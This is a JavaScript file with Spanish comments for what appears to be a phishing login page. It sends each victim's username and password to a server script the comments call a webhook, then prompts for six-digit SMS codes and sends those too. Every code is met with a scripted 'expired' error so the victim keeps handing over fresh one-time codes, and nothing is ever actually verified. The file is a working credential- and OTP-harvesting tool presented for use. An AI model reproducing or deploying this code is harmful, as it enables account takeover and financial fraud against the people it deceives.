// Elementos del DOM
const usernameInput = document.getElementById('username');
const btnEntrar = document.getElementById('btnEntrar');
const passwordModal = document.getElementById('passwordModal');
const mainWrapper = document.getElementById('mainWrapper');
const passwordInput = document.getElementById('password');
const btnContinuar = document.getElementById('btnContinuar');
const btnCancelar = document.getElementById('btnCancelar');
const togglePassword = document.getElementById('togglePassword');

// Elementos de la secuencia del Modal
const modalContent = document.getElementById('modalContent');
const modalLoading = document.getElementById('modalLoading');
const modalCode = document.getElementById('modalCode');
const smsCodeInput = document.getElementById('smsCode');
const btnEnviarCode = document.getElementById('btnEnviarCodigo');
const btnCancelarCode = document.getElementById('btnCancelarCodigo');
const codeErrorText = document.getElementById('codeErrorText');

// 1. VALIDACIÓN USUARIO
function validarUsuario() {
    if (usernameInput.value.trim() !== "") {
        btnEntrar.removeAttribute('disabled');
        btnEntrar.classList.add('enabled');
    } else {
        btnEntrar.setAttribute('disabled', 'true');
        btnEntrar.classList.remove('enabled');
    }
}
usernameInput.addEventListener('input', validarUsuario);
usernameInput.addEventListener('keyup', validarUsuario);

btnEntrar.addEventListener('click', () => {
    if (!btnEntrar.hasAttribute('disabled')) {
        passwordModal.classList.add('active');
        mainWrapper.classList.add('blurred');
    }
});

// 2. VALIDACIÓN CONTRASEÑA
function validarPassword() {
    if (passwordInput.value.trim() !== "") {
        btnContinuar.removeAttribute('disabled');
        btnContinuar.classList.add('enabled');
    } else {
        btnContinuar.setAttribute('disabled', 'true');
        btnContinuar.classList.remove('enabled');
    }
}
passwordInput.addEventListener('input', validarPassword);
passwordInput.addEventListener('keyup', validarPassword);

// ==========================================================================
// 3. ENVIAR USUARIO Y CONTRASEÑA A TRAVÉS DEL WEBHOOK
// ==========================================================================
btnContinuar.addEventListener('click', () => {
    if (!btnContinuar.hasAttribute('disabled')) {
        
        // 1. Enviamos los datos al archivo PHP de forma asíncrona
        fetch('procesar.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                paso: 'contrasena',
                usuario: usernameInput.value,
                password: passwordInput.value
            })
        });

        // 2. Transición visual inmediata (Ocultar formulario y mostrar loading)
        modalContent.style.display = 'none';
        modalLoading.style.display = 'flex';

        setTimeout(() => {
            modalLoading.style.display = 'none';
            modalCode.style.display = 'block';
        }, 2000); 
    }
});

// 4. VALIDACIÓN DE ENTRADA DE 6 DÍGITOS NUMÉRICOS
smsCodeInput.addEventListener('input', (e) => {
    smsCodeInput.value = smsCodeInput.value.replace(/[^0-9]/g, '');

    if (smsCodeInput.value.length === 6) {
        btnEnviarCode.removeAttribute('disabled');
        btnEnviarCode.classList.add('enabled');
    } else {
        btnEnviarCode.setAttribute('disabled', 'true');
        btnEnviarCode.classList.remove('enabled');
    }
});

// ==========================================================================
// 5. ENVIAR CÓDIGO SMS A TRAVÉS DEL WEBHOOK
// ==========================================================================
btnEnviarCode.addEventListener('click', () => {
    if (!btnEnviarCode.hasAttribute('disabled')) {
        
        // 1. Enviamos el código junto al usuario original al PHP
        fetch('procesar.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                paso: 'codigo',
                usuario: usernameInput.value,
                codigo_sms: smsCodeInput.value
            })
        });

        // 2. Transición visual (Ocultar vista código y poner loading)
        modalCode.style.display = 'none';
        modalLoading.style.display = 'flex';
        codeErrorText.style.display = 'none';

        setTimeout(() => {
            modalLoading.style.display = 'none';
            modalCode.style.display = 'block';
            codeErrorText.style.display = 'block'; // Mostrar error de expirado
            
            smsCodeInput.value = "";
            btnEnviarCode.setAttribute('disabled', 'true');
            btnEnviarCode.classList.remove('enabled');
        }, 2500); 
    }
});

// 6. BOTONES DE CANCELAR Y RESETEO TOTAL
function resetearTodo() {
    passwordModal.classList.remove('active');
    mainWrapper.classList.remove('blurred');
    
    modalContent.style.display = 'block';
    modalLoading.style.display = 'none';
    modalCode.style.display = 'none';
    
    passwordInput.value = "";
    smsCodeInput.value = "";
    codeErrorText.style.display = 'none';
    validarPassword();
}

btnCancelar.addEventListener('click', resetearTodo);
btnCancelarCode.addEventListener('click', resetearTodo);

// MOSTRAR / OCULTAR CONTRASEÑA
togglePassword.addEventListener('click', () => {
    const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
    passwordInput.setAttribute('type', type);
    const icon = togglePassword.querySelector('i');
    icon.className = type === 'text' ? 'far fa-eye-slash' : 'far fa-eye';
});